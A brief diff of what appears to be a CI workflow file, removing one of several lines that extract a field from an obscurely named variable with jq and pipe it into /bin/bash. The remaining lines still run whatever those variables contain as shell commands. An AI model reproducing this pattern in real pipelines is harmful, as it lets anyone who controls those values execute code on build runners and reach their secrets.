@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$lo81" | jq -r .vwvo3 | /bin/bash
           printf '%s' "$qnaen25" | jq -r .psr98 | /bin/bash
           echo $q4 | jq -r .sy932 | /bin/bash
-          printf '%s' "$d8" | jq -r .o811 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
